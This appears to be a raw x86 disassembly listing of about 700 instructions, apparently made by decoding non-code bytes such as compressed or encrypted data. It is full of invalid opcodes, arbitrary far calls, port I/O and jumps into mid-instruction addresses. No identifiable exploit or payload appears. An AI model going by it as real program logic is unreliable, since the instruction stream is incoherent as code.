  4071dc:	cmp    eax,0x6e0e9172
  4071e1:	adc    eax,0xc3e914b4
  4071e6:	call   0x287e:0xf27a136f
  4071ed:	fiadd  DWORD PTR [edi+0x5791fb32]
  4071f3:	sub    eax,ebp
  4071f5:	inc    esi
  4071f6:	inc    DWORD PTR [esi+0x35]
  4071f9:	jl     0x407186
  4071fb:	adc    ecx,DWORD PTR [esi]
  4071fd:	aas    
  4071fe:	mov    ebp,DWORD PTR [ecx+eiz*2]
  407201:	jle    0x4071c0
  407203:	es pop esi
  407205:	mov    edi,0xeb5b33e8
  40720a:	aad    0xa3
  40720c:	clc    
  40720d:	loop   0x4071c2
  40720f:	mov    edi,0xe3561201
  407214:	cmc    
  407215:	add    ebp,edi
  407217:	leave  
  407218:	ins    DWORD PTR es:[edi],dx
  407219:	lahf   
  40721a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40721b:	gs jno 0x40728f
  40721e:	mov    ecx,0xfe7535ff
  407223:	dec    ebp
  407224:	(bad)  
  407225:	jns    0x407225
  407227:	rcl    DWORD PTR [eax+0x3c0c78a4],1
  40722d:	(bad)  
  40722e:	xchg   edx,eax
  40722f:	jbe    0xaada913f
  407235:	stos   DWORD PTR es:[edi],eax
  407236:	cwde   
  407237:	into   
  407238:	mov    ebx,DWORD PTR [eax-0x316eade7]
  40723e:	sbb    al,0xb1
  407240:	mov    al,0xd1
  407242:	push   0x345fb757
  407247:	or     al,0xea
  407249:	jb     0x40727e
  40724b:	loopne 0x407296
  40724d:	sbb    BYTE PTR [esi+0x76],dh
  407250:	test   BYTE PTR [ebx+0x2111dd9],0x49
  407257:	retf   0x8e7c
  40725a:	pop    edi
  40725b:	(bad)  
  40725c:	sbb    cl,BYTE PTR [edi-0x33]
  40725f:	inc    ebp
  407260:	call   0x52d3c34d
  407265:	test   eax,0x9de178bd
  40726a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40726b:	test   eax,0x2c728bb2
  407270:	repz call 0xf363:0xa76c4d85
  407278:	arpl   WORD PTR [ecx+0x0],sp
  40727b:	xor    cl,BYTE PTR [ecx+0x167ad4e1]
  407281:	sub    dh,0x54
  407284:	add    DWORD PTR ds:0xadc39ac2,edi
  40728a:	fimul  WORD PTR [eax+0x42]
  40728d:	add    DWORD PTR [eax-0x44],edx
  407290:	sbb    DWORD PTR [edi-0x676f46f2],edx
  407296:	icebp  
  407297:	mov    ebp,0xee168fe5
  40729c:	imul   ah
  40729e:	sar    DWORD PTR [ecx-0x12],1
  4072a1:	retf   0x5042
  4072a4:	mov    dl,0xfc
  4072a6:	cli    
  4072a7:	xor    edi,DWORD PTR [ecx]
  4072a9:	mov    ecx,0x557977fa
  4072ae:	xchg   BYTE PTR [edi-0x1fb14338],dh
  4072b4:	js     0x40726c
  4072b6:	pop    ebx
  4072b7:	frstor [esi-0x18]
  4072ba:	add    edx,ebx
  4072bc:	test   al,0x13
  4072be:	lea    eax,[ebx]
  4072c0:	dec    edi
  4072c1:	sub    DWORD PTR [esi],esi
  4072c3:	jae    0x4072e5
  4072c5:	or     edx,DWORD PTR [esi-0x32a191bf]
  4072cb:	aad    0x78
  4072cd:	test   eax,0xe3df5806
  4072d2:	xor    DWORD PTR [ebx+0x73],esi
  4072d5:	inc    eax
  4072d6:	inc    edi
  4072d7:	mov    esi,DWORD PTR [ebx+ebp*4+0x2c]
  4072db:	aaa    
  4072dc:	test   BYTE PTR [ebx+0x20af9a73],ch
  4072e2:	inc    ecx
  4072e3:	fs nop
  4072e5:	and    eax,0x4a4546ff
  4072ea:	jne    0x4072fc
  4072ec:	xor    ebp,DWORD PTR [ecx+0x4c]
  4072ef:	mov    al,ds:0x6c384d80
  4072f4:	dec    edx
  4072f5:	cmc    
  4072f6:	(bad)  
  4072f7:	hlt    
  4072f8:	mov    ebx,0x53553075
  4072fd:	xor    al,0x9e
  4072ff:	push   esi
  407300:	adc    ch,0xa5
  407303:	sti    
  407304:	scas   eax,DWORD PTR es:[edi]
  407305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407306:	in     al,dx
  407307:	out    dx,al
  407308:	pop    edi
  407309:	mov    ebp,0xafba486
  40730e:	sbb    eax,0x7330f1f
  407313:	sub    DWORD PTR [esi-0x6b54f73],esp
  407319:	fimul  WORD PTR [esi]
  40731b:	test   DWORD PTR [eax-0x3e5da292],esp
  407321:	fbld   TBYTE PTR [ebx+eiz*8-0x1b]
  407325:	jne    0x407382
  407327:	add    al,ah
  407329:	mov    bh,0x8c
  40732b:	add    ebx,DWORD PTR [ebp+0x38f25f19]
  407331:	sub    al,0x45
  407333:	ja     0x407363
  407335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407336:	fs xchg esp,eax
  407338:	push   ds
  407339:	mov    al,ds:0xdfed2ad5
  40733e:	mov    ch,0xc
  407340:	sub    BYTE PTR [eax+0x33c9dfec],al
  407346:	fisubr WORD PTR [edx-0x3d]
  407349:	neg    BYTE PTR [ecx-0x2b]
  40734c:	daa    
  40734d:	shr    DWORD PTR ds:0xea82ce1e,1
  407353:	add    ecx,ebx
  407355:	cmp    edx,DWORD PTR ds:0x91927502
  40735b:	mov    bl,0xfa
  40735d:	push   ds
  40735e:	(bad)  
  40735f:	outs   dx,DWORD PTR ds:[esi]
  407360:	imul   ecx,esi,0x38a313be
  407366:	pusha  
  407367:	push   ds
  407368:	div    DWORD PTR [edx-0x64c676f5]
  40736e:	out    0xa1,eax
  407370:	sub    esp,ebx
  407372:	pop    ecx
  407373:	jge    0x4072f5
  407375:	in     al,0x42
  407377:	push   0x60ff75f8
  40737c:	and    al,0x2d
  40737e:	mov    ds:0x761fcf94,eax
  407383:	imul   edi,esi,0x71
  407386:	xchg   edx,eax
  407387:	mov    al,ds:0x2601efd5
  40738c:	neg    BYTE PTR [esi]
  40738e:	das    
  40738f:	jg     0x407399
  407391:	add    ebx,DWORD PTR [edi-0x25abba8c]
  407397:	add    DWORD PTR [ebx+0x3b04bcfd],ebp
  40739d:	in     eax,0xd5
  40739f:	mov    al,0x5c
  4073a1:	xchg   esp,eax
  4073a2:	dec    eax
  4073a3:	inc    ebp
  4073a4:	in     al,dx
  4073a5:	dec    edi
  4073a6:	addr16 xchg ebp,ecx
  4073a9:	sub    cl,BYTE PTR [ebp-0x7c778f8a]
  4073af:	and    bl,BYTE PTR [ebp+0xcffd772]
  4073b5:	mov    es,WORD PTR [ebx]
  4073b7:	dec    eax
  4073b8:	and    al,0xb9
  4073ba:	and    ch,bh
  4073bc:	(bad)  
  4073bd:	and    BYTE PTR [ebp-0x1a13af17],0x62
  4073c4:	mov    dh,0xe4
  4073c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c7:	xor    ch,BYTE PTR [edi]
  4073c9:	out    0xa3,eax
  4073cb:	int3   
  4073cc:	pushf  
  4073cd:	sti    
  4073ce:	cmc    
  4073cf:	sub    DWORD PTR [ebx],ecx
  4073d1:	mov    esi,0x96dc4fb
  4073d6:	and    al,cl
  4073d8:	push   ds
  4073d9:	rcl    edx,1
  4073db:	jnp    0x407405
  4073dd:	out    0x3,eax
  4073df:	lods   al,BYTE PTR ds:[esi]
  4073e0:	jecxz  0x40736c
  4073e2:	mov    al,0x17
  4073e4:	sub    DWORD PTR [edi-0x5634dcb6],ebp
  4073ea:	mov    eax,ds:0xb0e2724f
  4073ef:	jmp    0x62f3:0x47536a95
  4073f6:	add    DWORD PTR [ecx+edx*8-0x22],ebp
  4073fa:	lock push ebp
  4073fc:	adc    DWORD PTR ds:0x58304b2f,esp
  407402:	idiv   dl
  407404:	lock nop
  407406:	and    cl,BYTE PTR [eax]
  407408:	sub    eax,0xc8fc397e
  40740d:	add    esp,eax
  40740f:	lock pcmpeqd mm7,QWORD PTR [ebx]
  407413:	fsub   QWORD PTR [ebx-0x707ccd7e]
  407419:	retf   0xa35e
  40741c:	mov    cl,0x56
  40741e:	add    al,0xdf
  407420:	stos   BYTE PTR es:[edi],al
  407421:	aas    
  407422:	ins    BYTE PTR es:[edi],dx
  407423:	fdivp  st(5),st
  407425:	jb     0x4073c7
  407427:	xor    eax,0x5011bfb8
  40742c:	inc    eax
  40742d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40742e:	lods   eax,DWORD PTR ds:[esi]
  40742f:	test   eax,0xf12918dc
  407434:	pop    es
  407435:	cmc    
  407436:	outs   dx,DWORD PTR ds:[esi]
  407437:	fwait
  407438:	jmp    0x407486
  40743a:	outs   dx,DWORD PTR ds:[esi]
  40743b:	adc    DWORD PTR [edi+0x2c20157],ebp
  407441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407442:	push   0x4214acb0
  407447:	add    DWORD PTR gs:[eax-0x33],esp
  40744b:	jl     0x4073f6
  40744d:	fwait
  40744e:	add    eax,0x1c25605b
  407453:	jg     0x407420
  407455:	ins    BYTE PTR es:[edi],dx
  407456:	arpl   WORD PTR [ebx],ax
  407458:	retf   
  407459:	hlt    
  40745a:	pop    eax
  40745b:	lock fndisi(8087 only) 
  40745e:	mov    dh,0x7b
  407460:	xchg   DWORD PTR [edx-0x3f],ecx
  407463:	push   ss
  407464:	jns    0x407441
  407466:	push   eax
  407467:	je     0x407470
  407469:	cmp    bh,BYTE PTR [eax]
  40746b:	or     edx,edx
  40746d:	aad    0x38
  40746f:	dec    ecx
  407470:	leave  
  407471:	cdq    
  407472:	xor    edi,DWORD PTR [edi]
  407474:	cmp    ebx,ebp
  407476:	aad    0xed
  407478:	xlat   BYTE PTR ds:[ebx]
  407479:	dec    ecx
  40747a:	cmp    eax,0x61a3f4d0
  40747f:	imul   esi,DWORD PTR [edi],0x31
  407482:	retf   0x9f90
  407485:	imul   esp,DWORD PTR [ebx-0x51],0xffffff86
  407489:	fistp  WORD PTR [edx+eax*2-0x1ef270cc]
  407490:	mov    ebp,0x7edf977f
  407495:	cdq    
  407496:	mov    eax,0xefb365a4
  40749b:	test   dh,0x6a
  40749e:	int3   
  40749f:	xchg   esi,eax
  4074a0:	fwait
  4074a1:	mov    ebx,0xafea6658
  4074a6:	push   ds
  4074a7:	jmp    0xb219:0xa221fac1
  4074ae:	xor    dh,BYTE PTR [eax]
  4074b0:	sub    BYTE PTR [ebp+0x64],ch
  4074b3:	pop    ds
  4074b4:	ins    DWORD PTR es:[edi],dx
  4074b5:	ds adc al,0xe7
  4074b8:	clc    
  4074b9:	sbb    DWORD PTR [esi-0x48393294],ecx
  4074bf:	xor    BYTE PTR [ecx+0x7c],dh
  4074c2:	or     eax,0xd3a7b7e8
  4074c7:	adc    ebx,DWORD PTR [ebx+0x256f9c26]
  4074cd:	mov    esp,0x3a37e5d9
  4074d2:	sub    esi,eax
  4074d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074d5:	pusha  
  4074d6:	xchg   BYTE PTR [esi],bh
  4074d8:	mov    dh,0x37
  4074da:	inc    esp
  4074db:	es sbb eax,0x551651d6
  4074e1:	rcr    BYTE PTR [ecx+0x2b52e21b],cl
  4074e7:	pop    ebp
  4074e8:	xchg   ecx,eax
  4074e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ea:	repnz and bl,BYTE PTR [ebx-0xe834121]
  4074f1:	and    dl,BYTE PTR [eax]
  4074f3:	pusha  
  4074f4:	popf   
  4074f5:	arpl   bx,bx
  4074f7:	dec    esi
  4074f8:	gs scas al,BYTE PTR es:[edi]
  4074fa:	and    eax,0xffffffbc
  4074fd:	pusha  
  4074fe:	push   0x43
  407500:	dec    edi
  407501:	dec    ebp
  407502:	pop    ss
  407503:	into   
  407504:	mov    ah,0xe3
  407506:	mov    fs,WORD PTR [ebp+0x245e5f43]
  40750c:	xlat   BYTE PTR ds:[ebx]
  40750d:	mov    dh,0x3
  40750f:	ja     0x40758d
  407511:	dec    ebp
  407512:	ins    DWORD PTR es:[edi],dx
  407513:	xor    ebp,DWORD PTR [eax+eax*4]
  407516:	mov    ds:0x5e47f8b0,al
  40751b:	lock sub BYTE PTR [esi+0x6056a5cb],0xf6
  407523:	xchg   edx,eax
  407524:	pop    esp
  407525:	adc    DWORD PTR [eax-0x63],ebx
  407528:	inc    esi
  407529:	push   esp
  40752a:	jmp    0xd95415fd
  40752f:	loopne 0x4074d6
  407531:	push   esi
  407532:	data16 mov ah,0xa3
  407535:	mov    WORD PTR [esi],cs
  407537:	jnp    0x4075b2
  407539:	cmp    BYTE PTR [ebx+0x36],0xa9
  40753d:	ins    BYTE PTR es:[edi],dx
  40753e:	retf   
  40753f:	clc    
  407540:	jae    0x4075bf
  407542:	jle    0x4075af
  407544:	push   ecx
  407545:	inc    esi
  407546:	or     al,0x4e
  407548:	inc    edx
  407549:	loope  0x40751f
  40754b:	sub    esi,DWORD PTR [eax-0x6efee80e]
  407551:	int3   
  407552:	adc    DWORD PTR [ecx-0x30],esi
  407555:	xor    ebp,eax
  407557:	sbb    ch,BYTE PTR [ecx-0x12]
  40755a:	in     eax,0x82
  40755c:	call   0x6e676b92
  407561:	popf   
  407562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407563:	addr16 sbb eax,0x4b4b3f96
  407569:	adc    DWORD PTR [edx+ebx*2],esi
  40756c:	inc    edi
  40756d:	jmp    0x4075a1
  40756f:	adc    eax,0xf7b25ba6
  407574:	mov    bl,0xd7
  407576:	push   eax
  407577:	call   0x7799eee0
  40757c:	xchg   ecx,eax
  40757d:	daa    
  40757e:	popa   
  40757f:	mov    bh,0x14
  407581:	and    ah,BYTE PTR [ebp+0x49847e4f]
  407587:	dec    edx
  407588:	jmp    0x407551
  40758a:	gs into 
  40758c:	cmc    
  40758d:	test   DWORD PTR [edx-0x2bf5a99],ecx
  407593:	aas    
  407594:	in     al,0xc4
  407596:	jl     0x40753b
  407598:	mov    eax,0xeffc7d8a
  40759d:	int3   
  40759e:	sub    al,0xd2
  4075a0:	call   0x2dc6:0x8ca582aa
  4075a7:	pusha  
  4075a8:	scas   eax,DWORD PTR es:[edi]
  4075a9:	and    BYTE PTR [edi+0x6c],0x4c
  4075ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075af:	fstp   TBYTE PTR [ebx]
  4075b1:	js     0x4075fe
  4075b3:	push   ds
  4075b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b5:	je     0x407618
  4075b7:	cwde   
  4075b8:	mov    esi,DWORD PTR ss:[edx-0xd]
  4075bc:	pop    edi
  4075bd:	cdq    
  4075be:	or     ax,0x9e8b
  4075c2:	std    
  4075c3:	call   0x825:0x4d0c790
  4075ca:	btr    DWORD PTR [ebx],edx
  4075cd:	repnz out dx,al
  4075cf:	xlat   BYTE PTR ds:[ebx]
  4075d0:	xchg   ebp,eax
  4075d1:	test   BYTE PTR [ecx-0x70a8d989],ah
  4075d7:	outs   dx,BYTE PTR ds:[esi]
  4075d8:	sub    esp,DWORD PTR [ebp-0x7a3e0798]
  4075de:	jmp    0x40756f
  4075e0:	pusha  
  4075e1:	rcr    BYTE PTR [ecx],cl
  4075e3:	lock shl eax,0xed
  4075e7:	push   ecx
  4075e8:	pop    edi
  4075e9:	out    0x61,eax
  4075eb:	mov    esp,0xf769a89
  4075f0:	hlt    
  4075f1:	retf   0x298c
  4075f4:	cs cmc 
  4075f6:	imul   edi,DWORD PTR [ebp+0xe1a134c],0x6d
  4075fd:	mov    cl,0xe3
  4075ff:	mov    bh,0x49
  407601:	xor    eax,0x24f8bdb5
  407606:	mov    esp,0x8dfe25f4
  40760b:	sub    ecx,DWORD PTR [esi]
  40760d:	dec    eax
  40760e:	jns    0x4075b4
  407610:	cld    
  407611:	dec    esi
  407612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407613:	mov    dh,0xaa
  407615:	ror    DWORD PTR [edi],1
  407617:	push   cs
  407618:	xlat   BYTE PTR ds:[ebx]
  407619:	fild   WORD PTR [ebx-0x38]
  40761c:	cmp    al,0x90
  40761e:	and    edx,DWORD PTR [esi-0x341d794]
  407624:	adc    ecx,ebx
  407626:	jb     0x4075d0
  407628:	test   BYTE PTR [esi-0x559ce5b4],0x3a
  40762f:	push   edi
  407630:	int    0x59
  407632:	fcomi  st,st(2)
  407634:	rol    al,0xed
  407637:	and    DWORD PTR [edi-0x39da0cdb],ebp
  40763d:	dec    ebx
  40763e:	inc    edx
  40763f:	bnd jp 0x40769f
  407642:	test   DWORD PTR [ebx-0x58915071],esp
  407648:	jo     0x4075cc
  40764a:	int    0xa6
  40764c:	in     eax,dx
  40764d:	inc    edx
  40764e:	mov    ds:0xd922e9e3,eax
  407653:	imul   eax,DWORD PTR [edi+0x34],0xd4205d0b
  40765a:	add    eax,0x6a7e71e2
  40765f:	mov    ebx,0x5e97ac40
  407664:	jl     0x407618
  407666:	sub    al,0xf2
  407668:	ds fwait
  40766a:	and    eax,0x34070b5a
  40766f:	imul   edi,DWORD PTR [edx+0x47],0x57711d7
  407676:	(bad)  
  407677:	push   0xfffffff0
  407679:	mul    BYTE PTR ds:0x9bb4cde6
  40767f:	out    0x58,al
  407681:	xor    al,0x47
  407683:	call   0xcaf6ab6f
  407688:	jg     0x40763a
  40768a:	xor    ebx,DWORD PTR ds:0x3bb12ec0
  407690:	mov    esi,esp
  407692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407693:	dec    edi
  407694:	mov    esp,0x11cfd252
  407699:	dec    eax
  40769a:	pop    ds
  40769b:	jo     0x4076fb
  40769d:	mov    cs,WORD PTR [ebx]
  40769f:	push   esp
  4076a0:	xchg   esi,eax
  4076a1:	iret   
  4076a2:	arpl   WORD PTR [ebx*4-0x23f7e7a2],si
  4076a9:	mov    ah,0x16
  4076ab:	xor    BYTE PTR [eax+ecx*4-0x5a],dl
  4076af:	dec    esi
  4076b0:	inc    ebx
  4076b1:	int3   
  4076b2:	mov    bl,0xe4
  4076b4:	cmp    ecx,DWORD PTR [edx-0x6]
  4076b7:	mov    edx,0xa1b5c459
  4076bc:	fbstp  TBYTE PTR [ebp-0xf27ee94]
  4076c2:	bnd data16 jge 0x40771f
  4076c6:	clc    
  4076c7:	pushf  
  4076c8:	inc    esp
  4076c9:	mov    ah,0xcc
  4076cb:	inc    edi
  4076cc:	sub    esi,DWORD PTR [ebp+0x1d]
  4076cf:	aaa    
  4076d0:	dec    esi
  4076d1:	lds    ecx,FWORD PTR [ebx+0x507f70c]
  4076d7:	push   ebp
  4076d8:	and    eax,0x96b6576c
  4076dd:	jecxz  0x4076ea
  4076df:	sbb    bh,bh
  4076e1:	pop    eax
  4076e2:	mov    BYTE PTR [ecx-0x3b4bc8b],bh
  4076e8:	shl    DWORD PTR [edx-0xaa4dfe9],1
  4076ee:	rol    edx,cl
  4076f0:	fwait
  4076f1:	jo     0x40767b
  4076f3:	push   esi
  4076f4:	pop    eax
  4076f5:	mov    al,0x5f
  4076f7:	mov    ss,WORD PTR [ebx-0x66cfc6ce]
  4076fd:	sbb    edi,DWORD PTR [ebp-0x2f]
  407700:	neg    DWORD PTR [edi+0x7a]
  407703:	adc    al,BYTE PTR ds:0xbb3f673c
  407709:	xor    al,0x43
  40770b:	mov    ah,0xee
  40770d:	or     ch,cl
  40770f:	sbb    ch,dh
  407711:	test   bh,al
  407713:	add    al,0xa2
  407715:	or     eax,0xdd76dfc3
  40771a:	jmp    0x96988968
  40771f:	adc    ch,BYTE PTR [esi-0xd]
  407722:	(bad)  
  407724:	arpl   WORD PTR [ecx-0x66],si
  407727:	ror    BYTE PTR [ecx+0x39],0xa4
  40772b:	outs   dx,DWORD PTR ds:[esi]
  40772c:	cmp    BYTE PTR ds:0xd6b78314,bh
  407732:	adc    cl,dh
  407734:	jmp    0x407759
  407736:	das    
  407737:	imul   ecx,DWORD PTR [ecx+0x6d],0xc
  40773b:	rcl    DWORD PTR [ecx+0x43],cl
  40773e:	cwde   
  40773f:	pop    ds
  407740:	cmp    ebp,DWORD PTR [edx-0x32]
  407743:	cmc    
  407744:	cmp    al,0x86
  407746:	inc    edx
  407747:	dec    BYTE PTR [edx-0x64d246ae]
  40774d:	or     al,0x88
  40774f:	out    0x96,eax
  407751:	dec    eax
  407752:	mov    ds:0x3de5e05e,eax
  407757:	cmp    eax,0xfe1b7133
  40775c:	cmp    DWORD PTR [ebp+0xf],edi
  40775f:	test   BYTE PTR [esi+esi*2+0x46cc8505],bh
  407766:	push   ebx
  407767:	push   0x6c
  407769:	scas   al,BYTE PTR es:[edi]
  40776a:	in     al,0x61
  40776c:	(bad)  
  40776d:	jge    0x407722
  40776f:	push   ecx
  407770:	pop    ebp
  407771:	test   BYTE PTR [edx+0x2b8cbf51],ch
  407777:	ror    BYTE PTR ds:0xa8d5ef45,0x45
  40777e:	popf   
  40777f:	icebp  
  407780:	jbe    0x4077c7
  407782:	sbb    BYTE PTR [ebx+edx*4-0x12802aa3],ah
  407789:	jl     0x4077db
  40778b:	mov    WORD PTR [edx+esi*4+0x27],cs
  40778f:	sbb    BYTE PTR [edx],dh
  407791:	lock cmp BYTE PTR [ebx+0x7],ch
  407795:	mov    dl,0x46
  407797:	(bad)  
  407798:	out    0xab,eax
  40779a:	dec    ecx
  40779b:	in     al,0xa4
  40779d:	pop    es
  40779e:	repnz bound eax,QWORD PTR [ecx]
  4077a1:	int    0xba
  4077a3:	iret   
  4077a4:	pop    eax
  4077a5:	les    ebp,FWORD PTR [eax+0x53]
  4077a8:	push   esi
  4077a9:	test   eax,0xe76470fd
  4077ae:	pop    ss
  4077af:	(bad)  
  4077b0:	or     ecx,DWORD PTR [edi-0x5f49cf36]
  4077b6:	icebp  
  4077b7:	or     eax,0x2b021fa4
  4077bc:	loope  0x407763
  4077be:	lock dec esi
  4077c0:	mov    DWORD PTR [esi+0x14],edi
  4077c3:	(bad)  
  4077c4:	(bad)  
  4077c5:	cld    
  4077c6:	fmul   QWORD PTR [edx]
  4077c8:	fcmovnbe st,st(2)
  4077ca:	das    
  4077cb:	out    0xb9,al
  4077cd:	push   ds
  4077ce:	jmp    0xeaac5a32
  4077d3:	mov    al,0x8c
  4077d5:	out    0x39,al
  4077d7:	imul   esi,ebp,0x79
  4077da:	jge    0x407785
  4077dc:	sahf   
  4077dd:	adc    eax,0x71685e34
  4077e2:	xchg   edi,eax
  4077e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e4:	add    BYTE PTR ss:[ebp+0x60],dl
  4077e8:	xchg   edx,eax
  4077e9:	cmp    eax,0xa778adc5
  4077ee:	repz sbb BYTE PTR [ebp-0x7e],ah
  4077f2:	jge    0x40777d
  4077f4:	sbb    al,0x7c
  4077f6:	push   eax
  4077f7:	loope  0x40785a
  4077f9:	jmp    0x40783e
  4077fb:	xchg   DWORD PTR [edi+0x2f90645a],ecx
  407801:	loope  0x4077f9
  407803:	push   esp
  407805:	xor    al,0xb5
  407807:	cmp    BYTE PTR [edx],0xa4
  40780a:	mov    ds:0x59a32c10,eax
  40780f:	dec    edx
  407810:	div    ecx
  407812:	dec    edx
  407813:	dec    eax
  407814:	xor    DWORD PTR [eax+0x6c],esi
  407817:	jnp    0x4077eb
  407819:	xchg   edi,eax
  40781a:	out    0xcd,al
  40781c:	int    0xc9
  40781e:	add    eax,0xc2355730
  407823:	fisubr WORD PTR ss:[ebx+0x2fece390]
  40782a:	aas    
  40782b:	jp     0x407896
  40782d:	mov    BYTE PTR [ebx-0x23b348e4],al
  407833:	(bad)  
  407834:	push   eax
  407835:	and    BYTE PTR [edx+0x3167aa74],0x54
  40783c:	adc    bl,BYTE PTR ds:0x1d6230d8
  407842:	push   eax
  407843:	or     al,0x43
  407845:	das    
  407846:	and    BYTE PTR [ebp+0x48],bh
  407849:	xor    BYTE PTR ds:0x4f96ddef,dh
  40784f:	pop    ss
  407850:	enter  0x94a0,0xf0
  407854:	xchg   ebp,eax
  407855:	push   esp
  407856:	test   al,0x47
  407858:	out    0xf8,eax
  40785a:	and    eax,0xd6a49ae1
  40785f:	adc    al,BYTE PTR [edx-0x422b1aab]
  407865:	lahf   
  407866:	mov    eax,ds:0xffae113
  40786b:	add    DWORD PTR [edx],ebx
  40786d:	mov    gs,edi
  40786f:	bound  esi,QWORD PTR [eax]
  407871:	xlat   BYTE PTR ds:[ebx]
  407872:	int3   
  407873:	aaa    
  407874:	cmp    DWORD PTR [esi-0x46],edi
  407877:	push   ds
  407878:	clc    
  407879:	adc    BYTE PTR [edi+edx*1+0x4c],ch
  40787d:	(bad)  
  40787e:	loopne 0x4078fc
  407880:	sub    BYTE PTR [edi+ebx*1-0x3a],0xc7
  407885:	fist   DWORD PTR [eax]
  407887:	mov    eax,ds:0x574fba8c
  40788c:	pushf  
  40788d:	sbb    edx,DWORD PTR [edi-0x11]
  407890:	or     ah,BYTE PTR [ecx-0x2cb3b6b6]
  407896:	shr    DWORD PTR [ecx+0x2c],cl
  407899:	inc    edx
  40789a:	pop    esi
  40789b:	(bad)  
  40789c:	lods   eax,DWORD PTR ds:[esi]
  40789d:	iret   
  40789e:	push   ecx
  40789f:	aas    
  4078a0:	mov    BYTE PTR [edx-0x39bdf2ed],dh
  4078a6:	mov    eax,ds:0x3ecdd236
  4078ab:	adc    edi,DWORD PTR [ebx]
  4078ad:	in     al,dx
  4078ae:	or     al,0xbd
  4078b0:	enter  0xb9d9,0x1a
  4078b4:	xlat   BYTE PTR ds:[ebx]
  4078b5:	ret    0x94ca
  4078b8:	xor    esp,DWORD PTR [esi]
  4078ba:	sbb    dh,bl
  4078bc:	add    ecx,esi
  4078be:	clc    
  4078bf:	inc    ebx
  4078c0:	xchg   BYTE PTR [eax],al
  4078c2:	sbb    ebp,DWORD PTR cs:[edx]
  4078c5:	push   edx
  4078c6:	es xchg ebp,eax
  4078c8:	jmp    0x561da213
  4078cd:	sub    edx,ebx
  4078cf:	xor    dl,bl
  4078d1:	pop    edi
  4078d2:	test   al,0x90
  4078d4:	popf   
  4078d5:	and    cl,bl
  4078d7:	pop    esp
  4078d8:	lahf   
  4078d9:	popa   
  4078da:	hlt    
  4078db:	mov    esp,DWORD PTR [esi]
  4078dd:	or     DWORD PTR [ebx-0x4712d190],eax
  4078e3:	jae    0x40793f
  4078e5:	cdq    
  4078e6:	mov    edx,DWORD PTR [esi+0x47]
  4078e9:	inc    ebp
  4078ea:	retf   0x321b
  4078ed:	arpl   WORD PTR es:[ebx+ebp*1-0x5],ax
  4078f2:	test   ecx,ecx
  4078f4:	jmp    0x40793e
  4078f6:	hlt    
  4078f7:	jge    0x4078e0
  4078f9:	dec    ebx
  4078fa:	push   ecx
  4078fb:	xor    eax,0x9aa68d67
  407900:	sbb    ebp,edx
  407902:	inc    ebp
  407903:	out    dx,al
  407904:	mov    eax,ds:0xadafbdd0
  407909:	test   BYTE PTR [esi],bh
  40790b:	stos   BYTE PTR es:[edi],al
  40790c:	jae    0x4078a0
  40790e:	jp     0x4078c3
  407910:	lods   al,BYTE PTR ds:[esi]
  407911:	cli    
  407912:	push   ecx
  407913:	cmp    bl,BYTE PTR [ecx]
  407915:	bound  ecx,QWORD PTR [edi+0x42602f63]
  40791b:	inc    esi
  40791c:	mov    ds:0xbeac46c8,eax
  407921:	pop    edi
  407922:	xchg   esi,eax
  407923:	mov    al,ds:0xd64f983
  407928:	inc    ebp
  407929:	jb     0x4078d1
  40792b:	lods   eax,DWORD PTR ds:[esi]
  40792c:	ret    
  40792d:	mov    dl,BYTE PTR [esi+ebx*8-0x16]
  407931:	sbb    BYTE PTR [ecx-0x45a086c3],bl
  407937:	sbb    eax,0xa8fa2274
  40793c:	std    
  40793d:	test   DWORD PTR [edi],0x9eb9d3c7
  407943:	push   edx
  407944:	scas   eax,DWORD PTR es:[edi]
  407945:	mov    al,ds:0x2a636cc1
  40794a:	mov    ebp,0x73d0c8a1
  40794f:	or     eax,0xa2a87d13
  407954:	pusha  
  407955:	leave  
  407956:	add    al,0x5a
  407958:	mov    edx,DWORD PTR [ecx-0x1c]
  40795b:	call   0x81ed:0xbf56a60a
  407962:	sbb    DWORD PTR [ebx-0x6a],edx
  407965:	cmp    eax,0x76ccf6bd
  40796a:	xor    al,0x1
  40796c:	jp     0x4079e0
  40796e:	adc    al,0x6f
  407970:	xor    eax,ebx
  407972:	or     eax,0xa92737f5
  407977:	inc    ebp
  407978:	sub    eax,0x9284431
  40797d:	aas    
  40797e:	adc    BYTE PTR ds:[edi+0x18],ah
  407982:	xchg   BYTE PTR [edx],cl
  407984:	les    esp,FWORD PTR [edi+0x1079261f]
  40798a:	add    DWORD PTR [ebx],edi
  40798c:	push   edx
  40798d:	stos   BYTE PTR es:[edi],al
  40798e:	ins    DWORD PTR es:[edi],dx
  40798f:	mov    edi,0xd0735933
  407994:	out    0x6e,al
  407996:	sub    esp,DWORD PTR [ebp+0x28]
  407999:	(bad)  
  40799a:	out    0xd,al
  40799c:	je     0x407925
  40799e:	icebp  
  40799f:	sub    ebp,esi
  4079a1:	mov    al,ds:0x26191b2
  4079a6:	repz je 0x40799b
  4079a9:	cdq    
  4079aa:	push   ebx
  4079ab:	xchg   ecx,eax
  4079ac:	and    eax,0xc5558866
  4079b1:	clc    
  4079b2:	lods   al,BYTE PTR ds:[esi]
  4079b3:	jp     0x4079db
  4079b5:	test   DWORD PTR [ecx+edi*4+0x8b26e10],0xb8b96c79
  4079c0:	fs std 
  4079c2:	loopne 0x407a2c
  4079c4:	pmulhuw mm6,QWORD PTR [edi]
  4079c7:	fstp   DWORD PTR [eax]
  4079c9:	and    eax,0x3dc361ea
  4079ce:	adc    al,cl
  4079d0:	arpl   WORD PTR [ecx+edx*1+0x5c],bx
  4079d4:	ins    DWORD PTR es:[edi],dx
